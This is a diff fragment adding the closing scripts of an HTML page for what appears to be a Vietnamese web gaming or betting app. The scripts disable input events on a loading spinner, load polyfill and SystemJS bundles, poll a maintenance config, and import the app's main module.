+                &#39;touchstart&#39;,
+                function (event) {
+                    event.preventDefault();
+                },
+                { passive: false },
+            );
+
+            // Vô hiệu hóa sự kiện chuột
+            document.getElementById(&#39;spinner&#39;).addEventListener(&#39;mousedown&#39;, function (event) {
+                event.preventDefault();
+            });
+
+            // Vô hiệu hóa sự kiện cuộn (scroll)
+            document.getElementById(&#39;spinner&#39;).addEventListener(&#39;wheel&#39;, function (event) {
+                event.preventDefault();
+            });
+
+            // Cũng có thể sử dụng một số event khác nếu cần
+            // document.body.addEventListener(&#39;touchmove&#39;, function(event) {
+            //   event.preventDefault();
+            // });
+    </script>
+    <!-- Polyfills bundle. -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/js-polyfills/0.1.42/polyfill.min.js" charset="utf-8">
+    </script>
+    <script src="./lib/common360-v1-251610-1334.js" charset="utf-8">
+    </script>
+    <script src="./lib/howler.min.js" charset="utf-8">
+    </script>
+    <!-- Polyfills bundle. -->
+    <script src="src/polyfills.bundle.5adbf.js" charset="utf-8">
+    </script>
+    <!-- SystemJS support. -->
+    <script src="src/system.bundle.692e9.js" charset="utf-8">
+    </script>
+    <!-- Import map -->
+    <script src="src/import-map.e34b5.json" type="systemjs-importmap" charset="utf-8">
+    </script>
+    <script>
+      var minWithdraw = 0x30d40;
+            var sportPlaceBet = null;
+            var maints = null;
+            var browerToken = null;
+            var gameId = null;
+            const loadMaint = () =&gt; {
+                const jsonFilePath = &#39;./config/maint.json?v=&#39; + Date.now();
+                fetch(jsonFilePath)
+                    .then((response) =&gt; response.json())
+                    .then((data) =&gt; {
+                        maints = data;
+                    })
+                    .catch((error) =&gt; {
+                        console.error(&#39;Error fetching the JSON file:&#39;, error);
+                    });
+            };
+            setInterval(loadMaint, 60000);
+            loadMaint();
+            const fpPromise = new Promise((resolve, reject) =&gt; {
+                window.resolveFpPromise = resolve;
+                window.rejectFpPromise = reject;
+                setTimeout(() =&gt; {
+                    reject(new Error(&#39;Không thể tải dữ liệu&#39;));
+                }, 40000);
+            }).catch((error) =&gt; {
+                window.location.reload();
+            });
+            System.import(&#39;./index.a1740.js&#39;).catch(function (err) {
+                console.error(err);
+            });
+    </script>
+  </body>
 </html>
